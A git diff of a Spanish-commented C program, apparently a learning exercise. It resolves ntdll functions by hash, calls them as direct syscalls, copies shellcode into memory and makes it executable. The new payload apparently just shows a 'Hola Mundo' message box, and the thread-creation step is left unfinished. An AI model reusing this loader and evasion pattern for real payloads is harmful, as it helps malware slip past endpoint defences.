@@ -24,7 +24,7 @@ typedef struct _FUNC_VAL
 {
     ULONG magic_number;
     WORD call_number;
-} FUNC_VAL, *PFUNC_VAL;
+} FUNC_VAL, * PFUNC_VAL;
 
 
 // Environment
@@ -40,7 +40,7 @@ unsigned int Calculacion(const char* str) {
     int c;
 
     while ((c = *str++)) {
-        hash = ((hash << 5) + hash) + c; 
+        hash = ((hash << 5) + hash) + c;
     }
 
     return hash;
@@ -55,7 +55,7 @@ BOOL GetFunctionFrom(PVOID dllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirector
     for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
         PCHAR FunctionName = (PCHAR)((PBYTE)dllBase + pdwAddressOfNames[cx]);
         PVOID pFunctionAddress = (PBYTE)dllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
-        
+
         if (Calculacion(FunctionName) == value->magic_number)
         {
             print("[+] Funcion encontrada: %s", FunctionName);
@@ -123,8 +123,8 @@ BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImage
 
 PVOID CopyMem(PVOID dest, const PVOID src, SIZE_T len)
 {
-    char* d = (char*) dest;
-    const char* s = (const char*) src;
+    char* d = (char*)dest;
+    const char* s = (const char*)src;
     if (d < s)
     {
         while (len--)
@@ -187,8 +187,11 @@ int main()
     secondFunction.magic_number = 0x82962c8;
 
     // NtFreeVirtualMemory
-    thirdFunction.magic_number = 0x471aa7e9;
-    
+    //thirdFunction.magic_number = 0x471aa7e9;
+
+    // NtCreateThreadEx 
+    thirdFunction.magic_number = 0x376e0713;
+
     // Get NtAllocateVirtualMemory
     GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &firstFunction);
 
@@ -207,7 +210,24 @@ int main()
 
     // Payload
     BYTE payload[] = {
-        0xC3  // ret
+        0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x7c, 0x24, 0x10, 0x55, 0x48,
+        0x8b, 0xec, 0x48, 0x83, 0xec, 0x60, 0x33, 0xc0, 0xc7, 0x45, 0xd0, 0x75,
+        0x73, 0x65, 0x72, 0x48, 0x8d, 0x0d, 0xf6, 0x0f, 0x00, 0x00, 0x88, 0x45,
+        0xda, 0x88, 0x45, 0xea, 0xc7, 0x45, 0xd4, 0x33, 0x32, 0x2e, 0x64, 0x66,
+        0xc7, 0x45, 0xd8, 0x6c, 0x6c, 0xc7, 0x45, 0xf0, 0x4d, 0x65, 0x73, 0x73,
+        0xc7, 0x45, 0xf4, 0x61, 0x67, 0x65, 0x42, 0xc7, 0x45, 0xf8, 0x6f, 0x78,
+        0x41, 0x00, 0xc7, 0x45, 0xc0, 0x53, 0x68, 0x65, 0x6c, 0xc7, 0x45, 0xc4,
+        0x6c, 0x63, 0x6f, 0x64, 0x66, 0xc7, 0x45, 0xc8, 0x65, 0x00, 0xc7, 0x45,
+        0xe0, 0x48, 0x6f, 0x6c, 0x61, 0xc7, 0x45, 0xe4, 0x20, 0x4d, 0x75, 0x6e,
+        0x66, 0xc7, 0x45, 0xe8, 0x64, 0x6f, 0xff, 0x15, 0x90, 0x0f, 0x00, 0x00,
+        0x48, 0x8b, 0xc8, 0x48, 0x8d, 0x15, 0xa6, 0x0f, 0x00, 0x00, 0x48, 0x8b,
+        0xd8, 0xff, 0x15, 0x75, 0x0f, 0x00, 0x00, 0x48, 0x8d, 0x15, 0xa6, 0x0f,
+        0x00, 0x00, 0x48, 0x8b, 0xcb, 0x48, 0x8b, 0xf8, 0xff, 0x15, 0x62, 0x0f,
+        0x00, 0x00, 0x48, 0x8d, 0x4d, 0xd0, 0x48, 0x8b, 0xd8, 0xff, 0xd7, 0x48,
+        0x8d, 0x55, 0xf0, 0x48, 0x8b, 0xc8, 0xff, 0xd3, 0x45, 0x33, 0xc9, 0x4c,
+        0x8d, 0x45, 0xc0, 0x48, 0x8d, 0x55, 0xe0, 0x33, 0xc9, 0xff, 0xd0, 0x48,
+        0x8b, 0x5c, 0x24, 0x70, 0x48, 0x8b, 0x7c, 0x24, 0x78, 0x48, 0x83, 0xc4,
+        0x60, 0x5d, 0xc3
     };
 
     //
@@ -223,8 +243,8 @@ int main()
     //
     print("[*] Asignando memoria RW...");
     SetCall(firstFunction.call_number);
-    status = CallFunc((HANDLE)-1, &pAddr, 0, &payload_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-       
+    status = CallFunc((HANDLE)-1, &pAddr, 0, &payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
     if (status != 0)
     {
         print("[-] Error en NtAllocateVirtualMemory: 0x%08X", status);
@@ -244,7 +264,7 @@ int main()
     //  Read Write Memory
     //
     print("[*] Copiando payload...");
-    CopyMem( pAddr, (PVOID) payload, real_size);
+    CopyMem(pAddr, (PVOID)payload, real_size);
     print("[+] Payload copiado");
 
 
@@ -254,7 +274,7 @@ int main()
     print("[*] Cambiando permisos a RX...");
     SetCall(secondFunction.call_number);
     status = CallFunc((HANDLE)-1, &pAddr, &payload_size, PAGE_EXECUTE_READ, &ulOldProtect);
-   
+
     if (status != 0)
     {
         print("[-] Error cambiando permisos: 0x%08X", status);
@@ -263,15 +283,22 @@ int main()
 
     print("[+] Permisos cambiados exitosamente");
 
-    print("[*] Ejecutando payload...");
-    ((void(*)())pAddr)();
-    print("[+] Payload ejecutado");
+
+    //
+    //  Create Thread
+    //
+    print("[*] Creando hilo");
+    
+
+    /*  Well here's missing the NtCreateThread Function*/
+
+    SetCall(thirdFunction.call_number); // The syscall value
 
     //
     // Free memory
     //
 
-    SIZE_T free_size = 0;
+    /*SIZE_T free_size = 0;
 
     print("[*] Liberando memoria...");
     SetCall(thirdFunction.call_number);
@@ -284,5 +311,5 @@ int main()
     }
 
     print("[+] Memoria liberada %lld", free_size);
-    print("[+] Programa finalizado correctamente");
+    print("[+] Programa finalizado correctamente");*/
 }
